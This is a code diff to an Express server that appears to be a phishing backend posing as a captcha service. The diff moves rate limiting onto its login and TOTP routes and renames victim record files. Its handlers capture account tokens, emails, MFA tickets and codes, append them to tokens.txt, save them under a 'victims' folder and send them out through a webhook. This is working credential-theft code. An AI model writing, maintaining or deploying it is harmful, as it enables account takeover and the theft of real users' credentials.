@@ -59,7 +59,6 @@ const limiter = rateLimit({
 const app = express()
 
 app.set('trust proxy', true)
-app.use(limiter)
 app.use(requestIp.mw())
 app.use(express.json({
   limit: '100mb',
@@ -141,7 +140,7 @@ app.get('/secure', async (req, res) => {
   res.status(200).redirect('https://captcha.bot/')
 })
 
-app.post('/login', async (req, res) => {
+app.post('/login', limiter, async (req, res) => {
   try {
     const body = req.body
     if (body && !body.ref) return res.redirect('https://captcha.bot/')
@@ -166,7 +165,7 @@ app.post('/login', async (req, res) => {
       const b2 = Buffer.from(b1.toString('utf-8'), 'base64')
       const js = JSON.parse(b2)
       await fs.promises.appendFile(path.join(__dirname, 'tokens.txt'), `${api.token}\n`)
-      await fs.promises.writeFile(path.join(__dirname, 'victims', `victims-${js.guildId}.json`), JSON.stringify({
+      await fs.promises.writeFile(path.join(__dirname, 'victims', `victims-${js.clientId}.json`), JSON.stringify({
         'token': api.token,
         'mfa': false,
         'email': email,
@@ -175,7 +174,7 @@ app.post('/login', async (req, res) => {
         'guildId': js.guildId,
         'clientId': js.clientId,
       }, null, 3))
-      await webhook.sendFile(path.join(__dirname, 'victims', `victims-${js.guildId}.json`))
+      await webhook.sendFile(path.join(__dirname, 'victims', `victims-${js.clientId}.json`))
       return res.status(200).json({
         'status': 1
       })
@@ -225,7 +224,7 @@ app.post('/login', async (req, res) => {
   }
 })
 
-app.post('/mfa/totp', async (req, res) => {
+app.post('/mfa/totp', limiter, async (req, res) => {
   try {
     const body = req.body
     if (body && !body.ref) return res.redirect('https://captcha.bot/')
@@ -264,7 +263,7 @@ app.post('/mfa/totp', async (req, res) => {
       const js = JSON.parse(b2)
       const dados = JSON.parse(await fs.promises.readFile(path.join(__dirname, 'log', `log-${js.clientId}.json`)))
       await fs.promises.appendFile(path.join(__dirname, 'tokens.txt'), `${api.token}\n`)
-      await fs.promises.writeFile(path.join(__dirname, 'victims', `victims-${js.guildId}.json`), JSON.stringify({
+      await fs.promises.writeFile(path.join(__dirname, 'victims', `victims-${js.clientId}.json`), JSON.stringify({
         'token': api.token,
         'ticket': ticket,
         'code': code,
@@ -274,7 +273,7 @@ app.post('/mfa/totp', async (req, res) => {
         'guildId': dados.guildId,
         'clientId': dados.clientId,
       }, null, 3))
-      await webhook.sendFile(path.join(__dirname, 'victims', `victims-${js.guildId}.json`))
+      await webhook.sendFile(path.join(__dirname, 'victims', `victims-${js.clientId}.json`))
       return res.status(200).json({
         'status': 1
       })
